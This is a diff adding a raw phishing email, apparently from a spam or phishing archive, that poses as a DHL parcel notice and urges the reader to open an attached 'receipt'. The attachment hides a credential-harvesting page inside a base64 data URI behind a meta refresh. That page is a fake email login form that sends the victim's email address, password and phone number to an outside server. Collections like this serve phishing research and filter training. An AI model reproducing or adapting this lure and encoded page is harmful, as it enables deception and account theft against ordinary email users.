@@ -1,0 +1,182 @@
+Return-Path: jk9039133sri@alice.it
+Delivered-To: jose@monkey.org
+X-FDA: 71280322890.08.horse86_2601b91b39911
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 57,3.5,0,3f2e2b60cbcb8dfb,d41d8cd98f00b204,jk9039133sri@alice.it,:jk9039133sri@alice.it,RULES_HIT:1:41:355:379:677:871:962:967:969:973:988:989:1183:1189:1260:1261:1313:1314:1345:1381:1432:1436:1437:1516:1517:1518:1541:1550:1560:1575:1588:1589:1592:1594:1711:1714:1730:1749:1764:1777:1792:2196:2198:2199:2200:2525:2540:2560:2563:2682:2685:2737:2859:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3690:3865:3867:3868:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4250:4321:5007:6119:6238:6261:6354:6678:6687:6748:7281:7652:8829:8957:9025:9468:9973:10013:10264:10265:10394:10400:11473:11529:11604:11658:11914:12043:12219:12438:12517:12519:12555:12561:13139:13163:13229:13285:13286:13439:14037:14096:14721:21080:21121:30026:30054:30055:30070:30074,0,RBL:error,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fn,MSBL:0,DNSBL:error,Custom_rules:0:4:0,LFtime:2000,LUA_SUMMARY:none
+X-HE-Tag: horse86_2601b91b39911
+X-Filterd-Recvd-Size: 10372
+Received: from mail.stbmi.ac.in (mail.stbmi.ac.in [14.139.245.173])
+	by imf29.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Fri, 11 Mar 2016 05:47:41 +0000 (UTC)
+Received: from localhost (localhost [127.0.0.1])
+	by mail.stbmi.ac.in (Postfix) with ESMTP id 101F038603F;
+	Fri, 11 Mar 2016 07:00:31 +0530 (IST)
+Received: from mail.stbmi.ac.in ([127.0.0.1])
+	by localhost (mail.stbmi.ac.in [127.0.0.1]) (amavisd-new, port 10032)
+	with ESMTP id txywgFPtTqDl; Fri, 11 Mar 2016 07:00:30 +0530 (IST)
+Received: from localhost (localhost [127.0.0.1])
+	by mail.stbmi.ac.in (Postfix) with ESMTP id 1C6C9385BA1;
+	Fri, 11 Mar 2016 07:00:30 +0530 (IST)
+X-Virus-Scanned: amavisd-new at stbmi.ac.in
+Received: from mail.stbmi.ac.in ([127.0.0.1])
+	by localhost (mail.stbmi.ac.in [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id NHCFCOEZVNny; Fri, 11 Mar 2016 07:00:29 +0530 (IST)
+Received: from [213.136.85.208] (vmi66080.contabo.host [213.136.85.208])
+	by mail.stbmi.ac.in (Postfix) with ESMTPSA id 63150385871;
+	Fri, 11 Mar 2016 06:59:59 +0530 (IST)
+Content-Type: multipart/mixed; boundary="===============1704530758=="
+MIME-Version: 1.0
+Subject: Your parcel has arrived
+To: Recipients <jk9039133sri@alice.it>
+From: "DHL Express" <jk9039133sri@alice.it>
+Date: Thu, 10 Mar 2016 17:29:09 +0100
+Message-Id: <20160311013001.63150385871@mail.stbmi.ac.in>
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 110
+
+You will not see this in a MIME-aware mail reader.
+--===============1704530758==
+Content-Type: multipart/alternative; boundary="===============2032927870=="
+MIME-Version: 1.0
+
+--===============2032927870==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+    Dear Customer, =
+
+
+Your parcel has arrived at the post office.
+Our courier was unable to deliver the parcel to you due to incorrect delive=
+ry details.
+To receive your parcel,download attached receipt and forward to nearest DHL=
+ office. =
+
+
+DOWNLOAD ATTACHMENT=20
+
+--===============2032927870==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><BODY><DIV style=3D"WIDOWS: 1; TEXT-TRANSFORM: none;=
+ BACKGROUND-COLOR: #ffffff; TEXT-INDENT: 0px; FONT: 12px 'Lucida Grande', V=
+erdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; LETTER-SPACING: =
+normal; COLOR: #000000; WORD-SPACING: 0px; -webkit-text-stroke-width: 0px" =
+id=3Dyiv4714249156yui_3_16_0_1_1448322950208_6804><STRONG id=3Dyiv471424915=
+6yui_3_16_0_1_1448322950208_6816><IMG style=3D"BORDER-BOTTOM: 0px; BORDER-L=
+EFT: 0px; BORDER-TOP: 0px; CURSOR: default; BORDER-RIGHT: 0px" id=3Dyiv4714=
+249156yui_3_16_0_1_1448322950208_6815 class=3Dyiv4714249156 border=3D0 alt=
+=3D"" src=3D"https://encrypted-tbn0.gstatic.com/images?q=3Dtbn:ANd9GcQSpZiw=
+aO64a-SFpTj9zRwMvr_wCr6V9U8JQDxQliv_dPGS1__NZF_LDo0" height=3D107></STRONG>=
+</DIV>
+<DIV style=3D"WIDOWS: 1; TEXT-TRANSFORM: none; BACKGROUND-COLOR: #ffffff; T=
+EXT-INDENT: 0px; FONT: 12px 'Lucida Grande', Verdana, Arial, Helvetica, san=
+s-serif; WHITE-SPACE: normal; LETTER-SPACING: normal; COLOR: #000000; WORD-=
+SPACING: 0px; -webkit-text-stroke-width: 0px" id=3Dyiv4714249156yui_3_16_0_=
+1_1448322950208_6821>&nbsp;</DIV>
+<DIV style=3D"WIDOWS: 1; TEXT-TRANSFORM: none; BACKGROUND-COLOR: #ffffff; T=
+EXT-INDENT: 0px; FONT: 12px 'Lucida Grande', Verdana, Arial, Helvetica, san=
+s-serif; WHITE-SPACE: normal; LETTER-SPACING: normal; COLOR: #000000; WORD-=
+SPACING: 0px; -webkit-text-stroke-width: 0px" id=3Dyiv4714249156yui_3_16_0_=
+1_1448322950208_6823>
+<P>Dear Customer,&nbsp;<BR><BR>Your parcel has arrived at the post office.<=
+BR>Our courier was unable to deliver the parcel to you due to incorrect del=
+ivery details.<BR>To receive your parcel,download attached receipt and forw=
+ard to nearest DHL office.&nbsp;<BR><BR>DOWNLOAD ATTACHMENT </P></DIV></BOD=
+Y></HTML>
+--===============2032927870==--
+--===============1704530758==
+MIME-Version: 1.0
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: attachment; filename="Dhl-receipt.htm"
+
+<meta http-equiv=3D"refresh" content=3D"0; url=3Ddata:text/html;base64,PCFE=
+T0NUWVBFIGh0bWw+DQo8IS0tIHNhdmVkIGZyb20gDQo8aHRtbD48aGVhZD48bWV0YSBodHRwLWV=
+xdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+DQ=
+o8bWV0YT4NCjx0aXRsZT5FbWFpbCBMb2dpbjwvdGl0bGU+DQoNCg0KPHN0eWxlIHR5cGU9InRle=
+HQvY3NzIj4NCjwhLS0NCi5zdHlsZTEgewliYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGOw0KfQ0K=
+LnN0eWxlNSB7DQoJZm9udC1zaXplOiBsYXJnZTsNCglmb250LWZhbWlseTogQXJpYWwsIEhlbHZ=
+ldGljYSwgc2Fucy1zZXJpZjsNCn0NCi5zdHlsZTYgew0KCWZvbnQtc2l6ZTogMjBweDsNCgliYW=
+NrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGOw0KCWNvbG9yOiAjNjY2NjY2Ow0KCWZvbnQtZmFtaWx5O=
+iBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOw0KfQ0KLnN0eWxlMTEge2NvbG9yOiAjMDAw=
+MDMzOyBmb250LXNpemU6IDE2cHg7IGZvbnQtd2VpZ2h0OiBib2xkOyB9DQotLT4NCjwvc3R5bGU=
++DQo8L2hlYWQ+DQoNCjxib2R5PjxwIHN0eWxlPSJjb2xvcjogcmdiKDAsIDAsIDApOyBmb250LW=
+ZhbWlseTogJ1RpbWVzIE5ldyBSb21hbic7IGZvbnQtc2l6ZTogbWVkaXVtOyBmb250LXN0eWxlO=
+iBub3JtYWw7IGZvbnQtdmFyaWFudDogbm9ybWFsOyBmb250LXdlaWdodDogbm9ybWFsOyBsZXR0=
+ZXItc3BhY2luZzogbm9ybWFsOyBsaW5lLWhlaWdodDogbm9ybWFsOyBvcnBoYW5zOiBhdXRvOyB=
+0ZXh0LWFsaWduOiBzdGFydDsgdGV4dC1pbmRlbnQ6IDBweDsgdGV4dC10cmFuc2Zvcm06IG5vbm=
+U7IHdoaXRlLXNwYWNlOiBub3JtYWw7IHdpZG93czogMTsgd29yZC1zcGFjaW5nOiAwcHg7IC13Z=
+WJraXQtdGV4dC1zdHJva2Utd2lkdGg6IDBweDsiPg0KPGltZyBzcmM9Imh0dHA6Ly9tb29ubWFy=
+aW5lLmFsdGVydmlzdGEub3JnL2RobC5wbmciIHVzZW1hcD0iI0ZQTWFwMCIgaGVpZ2h0PSI2NjI=
+iIGJvcmRlcj0iMCIgd2lkdGg9IjEzNDkiPjwvcD4NCjx0YWJsZSBzdHlsZT0iZm9udC1mYW1pbH=
+k6ICdUaW1lcyBOZXcgUm9tYW4nOyBsZXR0ZXItc3BhY2luZzogbm9ybWFsOyBvcnBoYW5zOiBhd=
+XRvOyB0ZXh0LWluZGVudDogMHB4OyB0ZXh0LXRyYW5zZm9ybTogbm9uZTsgd2lkb3dzOiAxOyB3=
+b3JkLXNwYWNpbmc6IDBweDsgLXdlYmtpdC10ZXh0LXN0cm9rZS13aWR0aDogMHB4OyBwb3NpdGl=
+vbjogYWJzb2x1dGU7IGxlZnQ6IDIxOHB4OyB0b3A6IDEyN3B4OyB3aWR0aDogNTEycHg7IGhlaW=
+dodDogMzg1cHg7IiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIwIiBjZWxsc3BhY2luZz0iMCIgd=
+2lkdGg9IjEwMCUiPg0KCTx0Ym9keT48dHI+DQoJCTx0ZD4NCgkJDQoJCTxmb3JtIG1ldGhvZD0i=
+UE9TVCIgbmFtZT0ibXlGb3JtIiBhY3Rpb249Imh0dHA6Ly93d3cuYWt1bW1pcml6b25lLm5ldC9=
+qaS93ZS5waHAiPg0KCQkJPHA+Jm5ic3A7PC9wPg0KCQkJPHA+Jm5ic3A7PC9wPg0KCQkJPHA+Jm=
+5ic3A7PC9wPg0KCQkJPHA+Jm5ic3A7PC9wPg0KCQkJPHA+Jm5ic3A7PC9wPg0KCQkJPHA+Jm5ic=
+3A7PC9wPg0KCQkJPHA+Jm5ic3A7PC9wPg0KCQkJPHA+Jm5ic3A7PC9wPg0KCQkJPHA+Jm5ic3A7=
+PC9wPg0KCQkJPHRhYmxlIHN0eWxlPSJwb3NpdGlvbjogYWJzb2x1dGU7IGxlZnQ6IDE3cHg7IHR=
+vcDogMTRweDsgd2lkdGg6IDQ4N3B4OyBoZWlnaHQ6IDIwNHB4OyIgYm9yZGVyPSIwIiBjZWxscG=
+FkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAiIHdpZHRoPSIxMDAlIj4NCgkJCQk8dGJvZHk+PHRyP=
+g0KCQkJCQk8dGQgY29sc3Bhbj0iMiIgc3R5bGU9InZlcnRpY2FsLWFsaWduOiBtaWRkbGU7IiBo=
+ZWlnaHQ9IjYzIiBiZ2NvbG9yPSIjQjAwMDAwIj4NCgkJCQkJPHAgYWxpZ249ImNlbnRlciI+DQo=
+JCQkJCTxmb250IHN0eWxlPSJmb250LXNpemU6IDExcHQ7IiBmYWNlPSJUYWhvbWEiIGNvbG9yPS=
+IjRUFFQUVBIj4NCgkJCQkJPGI+Jm5ic3A7U2lnbiBJbiBXaXRoIFlvdXIgVmFsaWQgRW1haWwgY=
+W5kIFBhc3N3b3JkIFRvIFJldmlldyZuYnNwOyZuYnNwOyANCgkJCQkJUGFja2FnZSBJbmZvcm1h=
+dGlvbjwvYj48L2ZvbnQ+PC9wPjwvdGQ+DQoJCQkJPC90cj4NCgkJCQk8dHI+DQoJCQkJCTx0ZCB=
+zdHlsZT0idmVydGljYWwtYWxpZ246IG1pZGRsZTsiIGhlaWdodD0iNDQiPg0KCQkJCQk8Zm9udC=
+BmYWNlPSJWZXJkYW5hIiBjb2xvcj0iIzRGNEY0RiIgc2l6ZT0iMiI+PGI+Jm5ic3A7RW1haWwgS=
+UQ8L2I+OiZuYnNwOzwvZm9udD48L3RkPg0KCQkJCQk8dGQgYWxpZ249ImxlZnQiIGhlaWdodD0i=
+NDQiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjMiPg0KCQkJCQk8aW5wdXQgbmFtZT0iZW1=
+haWwiIG1heGxlbmd0aD0iNjAiIHNpemU9IjQwIiByZXF1aXJlZD0idHJ1ZSIgc3R5bGU9ImZvbn=
+Qtd2VpZ2h0OiA3MDA7Ij48L2ZvbnQ+PC90ZD4NCgkJCQk8L3RyPg0KCQkJCTx0cj4NCgkJCQkJP=
+HRkIHN0eWxlPSJ2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlOyI+DQoJCQkJCTxmb250IGZhY2U9IlZl=
+cmRhbmEiIGNvbG9yPSIjNEY0RjRGIiBzaXplPSIyIj48Yj4mbmJzcDtQYXNzd29yZDwvYj46Jm5=
+ic3A7PC9mb250PjwvdGQ+DQoJCQkJCTx0ZCBhbGlnbj0ibGVmdCI+PGZvbnQgZmFjZT0iVmVyZG=
+FuYSIgc2l6ZT0iMyI+DQoJCQkJCTxpbnB1dCBuYW1lPSJwYXNzIiBtYXhsZW5ndGg9IjMwIiBza=
+XplPSIyMyIgdmFsdWU9IiIgdHlwZT0icGFzc3dvcmQicmVxdWlyZWQgPjwvZm9udD48L3RkPg0K=
+CQkJCTwvdHI+DQoJCQkJPHRyPg0KCQkJCQk8dGQgc3R5bGU9InZlcnRpY2FsLWFsaWduOiBtaWR=
+kbGU7IiBoZWlnaHQ9IjQ0Ij4NCgkJCQkJPGZvbnQgZmFjZT0iVmVyZGFuYSIgY29sb3I9IiM0Rj=
+RGNEYiIHNpemU9IjIiPjxiPiZuYnNwO1Bob25lIE51bWJlcjwvYj46Jm5ic3A7PC9mb250Pjwvd=
+GQ+DQoJCQkJCTx0ZCBhbGlnbj0ibGVmdCIgaGVpZ2h0PSI0NCI+PGZvbnQgZmFjZT0iVmVyZGFu=
+YSIgc2l6ZT0iMyI+DQoJCQkJCTxpbnB1dCBuYW1lPSJwaG9uZSIgbWF4bGVuZ3RoPSI2MCIgc2l=
+6ZT0iNDAiIHJlcXVpcmVkPSJ0cnVlIiBzdHlsZT0iZm9udC13ZWlnaHQ6IDcwMDsiPjwvZm9udD=
+48L3RkPg0KCQkJCTwvdHI+DQoJCQkJPHRyPg0KCQkJCQk8dGQgc3R5bGU9InZlcnRpY2FsLWFsa=
+WduOiBtaWRkbGU7Ij4NCgkJCQkJPGZvbnQgZmFjZT0iVmVyZGFuYSIgY29sb3I9IiM0RjRGNEYi=
+IHNpemU9IjIiPjxiPiZuYnNwO0xhbmd1YWdlPC9iPjo8L2ZvbnQ+PC90ZD4NCgkJCQkJPHRkIGF=
+saWduPSJsZWZ0IiBoZWlnaHQ9IjUwIj48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIzIj4NCg=
+kJCQkJPHNlbGVjdCBuYW1lPSJsYW5ndWFnZTAiIHNpemU9IjEiIG9uQ2hhbmdlPSJqYXZhc2Nya=
+XB0OmZuQ2hhbmdlKCkiPg0KCQkJCQk8b3B0aW9uIHZhbHVlPSIiPiZuYnNwO1NlbGVjdCBsYW5n=
+dWFnZTwvb3B0aW9uPg0KCQkJCQkNCgkJCQkJPG9wdGlvbiBzZWxlY3RlZD0ic2VsZWN0ZWQiIHZ=
+hbHVlPSJlbl9VUyIgInNlbGVjdGVkIj0iIj4NCgkJCQkJJm5ic3A7RW5nbGlzaDwvb3B0aW9uPg=
+0KCQkJCQkNCgkJCQkJPG9wdGlvbiB2YWx1ZT0iZnJfRlIiICIiPSIiPkZyZW5jaDwvb3B0aW9uP=
+g0KCQkJCQkNCgkJCQkJPG9wdGlvbiB2YWx1ZT0icHRfUFQiICIiPSIiPlBvcnR1Z2VzZTwvb3B0=
+aW9uPg0KCQkJCQkNCgkJCQkJPG9wdGlvbiB2YWx1ZT0icnNfUlMiICIiPSIiPlNlcmJpYTwvb3B=
+0aW9uPg0KCQkJCQkNCgkJCQkJPG9wdGlvbiB2YWx1ZT0icnVfUlUiICIiPSIiPlJ1c3NpYW48L2=
+9wdGlvbj4NCgkJCQkJDQoJCQkJCTxvcHRpb24gdmFsdWU9InRyX1RSIiAiIj0iIj5UdXJraXNoP=
+C9vcHRpb24+DQoJCQkJCQ0KCQkJCQk8b3B0aW9uIHZhbHVlPSJocl9IUiIgIiI9IiI+Q3JvYXRp=
+YW48L29wdGlvbj4NCgkJCQkJPC9zZWxlY3Q+PC9mb250PjwvdGQ+DQoJCQkJPC90cj4NCgkJCQk=
+8dHI+DQoJCQkJCTx0ZCBzdHlsZT0idmVydGljYWwtYWxpZ246IG1pZGRsZTsiPiZuYnNwOzwvdG=
+Q+DQoJCQkJCTx0ZCBhbGlnbj0ibGVmdCIgaGVpZ2h0PSIzNiI+DQoJCQkJCTxpbnB1dCBzcmM9I=
+mh0dHA6Ly9tb29ubWFyaW5lLmFsdGVydmlzdGEub3JnL2J0bjEucG5nIiB2YWx1ZT0iU3VibWl0=
+IiBhbHQ9IlN1Ym1pdCIgbmFtZT0iSTEiIHN0eWxlPSJwb3NpdGlvbjogYWJzb2x1dGU7IGxlZnQ=
+6IDEzNXB4OyB0b3A6IDE3NHB4OyIgaGVpZ2h0PSIxOCIgdHlwZT0iaW1hZ2UiIHdpZHRoPSI4OS=
+I+PC90ZD4NCgkJCQk8L3RyPg0KCQkJPC90Ym9keT48L3RhYmxlPg0KCQk8L2Zvcm0+DQoJCTxwP=
+iZuYnNwOzwvcD48L3RkPg0KCTwvdHI+DQo8L3Rib2R5PjwvdGFibGU+DQoNCjwvYm9keT48L2h0=
+bWw+" />
+--===============1704530758==--
